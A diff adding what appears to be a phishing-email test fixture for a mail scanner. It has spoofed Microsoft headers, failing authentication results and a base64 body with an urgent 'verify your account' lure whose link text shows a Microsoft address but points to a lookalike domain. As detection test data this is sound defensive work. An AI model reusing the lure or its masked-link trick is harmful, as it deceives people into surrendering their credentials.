@@ -1,0 +1,16 @@
+Return-Path: <x@bulk-sender.net>
+Authentication-Results: mx.inspekt.local; spf=softfail smtp.mailfrom=bulk-sender.net; dkim=none; dmarc=fail header.from=micros0ft-support.com
+From: "Microsoft account team <security@microsoft.com>" <alerts@micros0ft-support.com>
+Reply-To: helpdesk@gmail-recovery.net
+To: victim@example.org
+Subject: =?utf-8?B?VW51c3VhbCBzaWduLWluIGFjdGl2aXR5?=
+Date: Wed, 21 Oct 2026 03:12:00 +0000
+Message-ID: <a1b2@micros0ft-support.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PHA+V2UgZGV0ZWN0ZWQgYW4gdW51c3VhbCBzaWduLWluIHRvIHlvdXIgYWNj
+b3VudC48L3A+CjxwPlBsZWFzZSB2ZXJpZnkgeW91ciBhY2NvdW50IHdpdGhpbiAyNCBob3Vyczo8
+L3A+CjxhIGhyZWY9Imh0dHA6Ly9sb2dpbi1taWNyb3MwZnQuY29tL3Nlc3Npb24/aWQ9ODgxMiI+
+aHR0cHM6Ly9hY2NvdW50Lm1pY3Jvc29mdC5jb20vc2VjdXJpdHk8L2E+CjwvYm9keT48L2h0bWw+
